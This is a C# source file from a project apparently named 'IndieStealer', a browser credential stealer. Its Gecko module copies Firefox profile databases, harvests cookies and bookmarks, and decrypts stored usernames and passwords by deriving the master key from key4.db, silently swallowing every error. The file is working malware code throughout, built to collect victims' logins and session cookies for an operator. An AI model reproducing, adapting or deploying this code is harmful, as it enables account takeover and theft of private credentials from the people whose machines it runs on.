using IndieStealer.Collect.Browsers.Gecko.Decrypt;
using System;
using System.Collections.Generic;
using System.Data;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Web.Script.Serialization;

namespace IndieStealer.Collect.Browsers.Gecko
{
    class Gecko
    {
        private static readonly byte[] Key4MagicNumber = new byte[16]
        {
            248,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            1
        };
        public static void GetCookies()
        {
            try
            {
                foreach (var browserModel in BrowserDataStorage.Browsers)
                {
                    if (browserModel.Profiles == null || browserModel.LocalKeyPath != null)
                        continue;
                    foreach (var profile in browserModel.Profiles)
                    {
                        if (File.Exists(profile.Path + "\\cookies.sqlite"))
                        {
                            try
                            {
                                BrowserData browserData = new BrowserData();
                                List<BrowserDataModels.Cookie> cookies = null;
                                MemoryStream memoryStream = new MemoryStream();
                                using (FileStream fileStream = new FileStream(Path.GetFullPath(profile.Path + "\\cookies.sqlite"), FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                                    fileStream.CopyTo(memoryStream);
                                Sqlite3 sSQLite = new Sqlite3(memoryStream.ToArray());
                                sSQLite.ReadTable("moz_cookies");
                                for (int i = 0; i < sSQLite.GetRowCount(); i++)
                                {
                                    try
                                    {
                                                                            
                                        string host = sSQLite.GetValue(i, "host").Trim();
                                        string path = sSQLite.GetValue(i, "path").Trim();
                                        string secure = sSQLite.GetValue(i, "isSecure");
                                        string exp = long.Parse(sSQLite.GetValue(i, "expiry").Trim()).ToString();
                                        string name = sSQLite.GetValue(i, "name").Trim();
                                        string value = sSQLite.GetValue(i, "value");
                                        if (host == null && value == null)
                                            continue;
                                        if (cookies == null)
                                            cookies = new List<BrowserDataModels.Cookie>();
                                        cookies.Add(new BrowserDataModels.Cookie {
                                            Domain = host,
                                            IsHttp = "FALSE",
                                            Path = path/*values[2]*/,
                                            IsSecure = secure.Contains("1").ToString().ToUpper(),
                                            Expires = exp,
                                            Name = name/*values[1]*/,
                                            Value = value
                                        });
                                        
                                    }
                                    catch (Exception ex)
                                    { }
                                }
                                if (cookies == null)
                                    continue;
                                if (BrowserDataStorage.BrowserData.ContainsKey(profile))
                                {
                                    if (BrowserDataStorage.BrowserData[profile].Cookies != null)
                                        BrowserDataStorage.BrowserData[profile].Cookies.AddRange(cookies);
                                    else
                                        BrowserDataStorage.BrowserData[profile].Cookies = cookies;
                                }
                                else
                                {
                                    browserData.Cookies = cookies;
                                    BrowserDataStorage.BrowserData.Add(profile, browserData);
                                }
                            }
                            catch (Exception exception)
                            {}
                            
                        }
                    }
                }
            }
            catch (Exception ex)
            {}      
        }
        public static void GetBookmarks()
        {
            try
            {
                foreach (var browserModel in BrowserDataStorage.Browsers)
                {
                    if (browserModel.Profiles == null || browserModel.LocalKeyPath != null)
                        continue;
                    foreach (var profile in browserModel.Profiles)
                    {
                        if (File.Exists(profile.Path + "\\places.sqlite"))
                        {
                            try
                            {
                                BrowserData browserData = new BrowserData();
                                List<BrowserDataModels.Bookmark> bookmarks = null;
                                MemoryStream memoryStream = new MemoryStream();
                                using (FileStream fileStream = new FileStream(Path.GetFullPath(profile.Path + "\\places.sqlite"), FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                                    fileStream.CopyTo(memoryStream);
                                Sqlite3 sSQLite = new Sqlite3(memoryStream.ToArray());
                                sSQLite.ReadTable("moz_bookmarks");
                                for (int i = 0; i < sSQLite.GetRowCount(); i++)
                                {
                                    try
                                    {
                                        string title = Encoding.UTF8.GetString(Encoding.UTF8.GetBytes(
                                            sSQLite.GetValue(i, 5)));
                                        string url = sSQLite.GetValue(i, 1);
                                        string[] values = new string[3];
                                        for (int j = 1; j < 4; j++)
                                        {
                                            values[j] = sSQLite.GetValue(i, j + 1);
                                        }
                                        if ((url == null && title == null) || (url != "0" && title == "0"))
                                            continue;
                                        if (bookmarks == null)
                                            bookmarks = new List<BrowserDataModels.Bookmark>();
                                        bookmarks.Add(new BrowserDataModels.Bookmark {
                                            Title = title,
                                            Url = url
                                        });

                                    }
                                    catch (Exception ex)
                                    { }
                                }
                                if (bookmarks == null)
                                    continue;
                                if (BrowserDataStorage.BrowserData.ContainsKey(profile))
                                {
                                    if (BrowserDataStorage.BrowserData[profile].Bookmarks != null)
                                        BrowserDataStorage.BrowserData[profile].Bookmarks.AddRange(bookmarks);
                                    else
                                        BrowserDataStorage.BrowserData[profile].Bookmarks = bookmarks;

                                }
                                else
                                {
                                    browserData.Bookmarks = bookmarks;
                                    BrowserDataStorage.BrowserData.Add(profile, browserData);
                                }
                            }
                            catch (Exception exception)
                            {}
                           
                        }
                    }
                }

            
                
            }
            catch (Exception ex)
            {}         
        }
        public static void GetPasswords()
        {
            try
            {
                foreach (var browserModel in BrowserDataStorage.Browsers)
                {
                    if (browserModel.Profiles == null || browserModel.LocalKeyPath != null)
                        continue;
                    foreach (var profile in browserModel.Profiles)
                    {
                        if (File.Exists(profile.Path + "\\logins.json"))
                        {
                            BrowserData browserData = new BrowserData();
                            List<BrowserDataModels.Login> logins = null;
                            try
                            {
                                FFLogins ffLoginData;
                                using (StreamReader sr = new StreamReader(profile.Path + "\\logins.json"))
                                {

                                    JavaScriptSerializer jsd = new JavaScriptSerializer();
                                    string json = sr.ReadToEnd();
                                    ffLoginData = jsd.Deserialize<FFLogins>(json);
                                }
                                string dbPath = profile.Path + "\\key4.db";
                                if (File.Exists(dbPath))
                                {
                                    using (FileStream fileStream = new FileStream(dbPath, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite))
                                    {
                                        byte[] privateKey = new byte[24];
                                        byte[] fileBytes = new byte[fileStream.Length];
                                        fileStream.Read(fileBytes, 0, fileBytes.Length);
                                        Asn1Der asn = new Asn1Der();
                                        Sqlite3 sqlite3 = new Sqlite3(fileBytes);
                                        sqlite3.ReadTable("metaData");
                                        var globalSalt = Encoding.Default.GetBytes(sqlite3.GetValue(0, "item1"));
                                        var item2Bytes = Encoding.Default.GetBytes(sqlite3.GetValue(0, "item2)"));
                                        Asn1DerObject asn1Object1 = asn.Parse(item2Bytes);
                                        string asnString = asn1Object1.ToString();
                                        if (asnString.Contains("2A864886F70D010C050103"))
                                        {
                                            var entrySalt = asn1Object1.objects[0].objects[0].objects[1].objects[0].Data;
                                            var cipherText = asn1Object1.objects[0].objects[1].Data;
                                            DecryptMoz3DES decryptMoz = new DecryptMoz3DES(cipherText, globalSalt, new byte[0], entrySalt);
                                            var passwordCheck = decryptMoz.Compute();
                                            string decryptedPwdChk = Encoding.Default.GetString(passwordCheck);

                                            if (!decryptedPwdChk.StartsWith("password-check"))
                                            {
                                                continue;
                                            }
                                        }
                                        else if (asnString.Contains("2A864886F70D01050D"))
                                        {
                                            var entrySalt = asn1Object1.objects[0].objects[0].objects[1].objects[0].objects[1].objects[0].Data;
                                            var partIV = asn1Object1.objects[0].objects[0].objects[1].objects[2].objects[1].Data;
                                            var cipherText = asn1Object1.objects[0].objects[0].objects[1].objects[3].Data;
                                            MozillaPBE CheckPwd = new MozillaPBE(cipherText, globalSalt, new byte[0], entrySalt, partIV);
                                            byte[] passwordCheck = CheckPwd.Compute();
                                            string decryptedPwdChk = Encoding.Default.GetString(passwordCheck);

                                            if (!decryptedPwdChk.StartsWith("password-check"))
                                            {
                                                continue;
                                            }
                                        }
                                        sqlite3.ReadTable("nssPrivate");
                                        int rowLength = sqlite3.GetRowCount();
                                        string a11 = string.Empty;

                                        for (int rowIndex = 0; rowIndex < rowLength; ++rowIndex)
                                        {

                                            if (sqlite3.GetValue(rowIndex, "a102") == Encoding.Default.GetString(Key4MagicNumber))
                                            {
                                                a11 = sqlite3.GetValue(rowIndex, "a11");
                                                break;
                                            }
                                        }
                                        Asn1DerObject asn1Object2 = asn.Parse(Encoding.Default.GetBytes(a11));
                                        var keyEntrySalt = asn1Object2.objects[0].objects[0].objects[1].objects[0].objects[1].objects[0].Data;
                                        var keyPartIV = asn1Object2.objects[0].objects[0].objects[1].objects[2].objects[1].Data;
                                        var keyCipherText = asn1Object2.objects[0].objects[0].objects[1].objects[3].Data;
                                        MozillaPBE PrivKey = new MozillaPBE(keyCipherText, globalSalt, new byte[0], keyEntrySalt, keyPartIV);
                                        var fullprivateKey = PrivKey.Compute();
                                        Array.Copy(fullprivateKey, privateKey, privateKey.Length);
                                        sqlite3.Dispose();                                      
                                        List<BrowserDataModels.Login> credList = ParseLogins(ffLoginData, privateKey);
                                        if (credList.Count > 0)
                                        {
                                            if (logins == null)
                                                logins = new List<BrowserDataModels.Login>();
                                            logins.AddRange(credList);
                                        }
                                    }
                                }                               
                            }
                            catch (Exception ex)
                            { }
                            if (logins == null)
                                continue;
                            if (BrowserDataStorage.BrowserData.ContainsKey(profile))
                            {
                                if (BrowserDataStorage.BrowserData[profile].Logins != null)
                                    BrowserDataStorage.BrowserData[profile].Logins.AddRange(logins);
                                else
                                    BrowserDataStorage.BrowserData[profile].Logins = logins;
                            }
                            else
                            {
                                browserData.Logins = logins;
                                BrowserDataStorage.BrowserData.Add(profile, browserData);
                            }        
                        }
                    }
                }
                
            }
            catch (Exception exception)
            { }
            
        }
        private static List<BrowserDataModels.Login> ParseLogins(FFLogins ffLoginData, byte[] privateKey)
        {
            List<BrowserDataModels.Login> loginPairList = new List<BrowserDataModels.Login>();
            Asn1Der asn = new Asn1Der();
            try
            {
                foreach (LoginData loginData in ffLoginData.logins)
                {
                    Asn1DerObject userNameObject = asn.Parse(Convert.FromBase64String(loginData.encryptedUsername));
                    Asn1DerObject passwordObject = asn.Parse(Convert.FromBase64String(loginData.encryptedPassword));
                    string decUsername = TripleDES.TripleDESHelper.DESCBCDecryptor(privateKey, userNameObject.objects[0].objects[1].objects[1].Data, userNameObject.objects[0].objects[2].Data);                     string decPassword = TripleDES.TripleDESHelper.DESCBCDecryptor(privateKey, passwordObject.objects[0].objects[1].objects[1].Data, passwordObject.objects[0].objects[2].Data);                     if (loginData.hostname == null || (string.IsNullOrEmpty(decUsername) && string.IsNullOrEmpty(decPassword)))
                        continue;
                    BrowserDataModels.Login loginPair = new BrowserDataModels.Login()
                    {
                        Url = loginData.hostname,
                        Username = Regex.Replace(decUsername, @"[^\u0020-\u007F]", ""),
                        Password = Regex.Replace(decPassword, @"[^\u0020-\u007F]", "")
                    };
                    loginPairList.Add(loginPair);
                }
            }
            catch
            {
            }
            return loginPairList;
        }
    }

    class FFLogins
    {
        public long nextId { get; set; }
        public LoginData[] logins { get; set; }
        public string[] disabledHosts { get; set; }
        public int version { get; set; }
    }

    class LoginData
    {
        public long id { get; set; }
        public string hostname { get; set; }
        public string url { get; set; }
        public string httprealm { get; set; }
        public string formSubmitURL { get; set; }
        public string usernameField { get; set; }
        public string passwordField { get; set; }
        public string encryptedUsername { get; set; }
        public string encryptedPassword { get; set; }
        public string guid { get; set; }
        public int encType { get; set; }
        public long timeCreated { get; set; }
        public long timeLastUsed { get; set; }
        public long timePasswordChanged { get; set; }
        public long timesUsed { get; set; }
    }
}
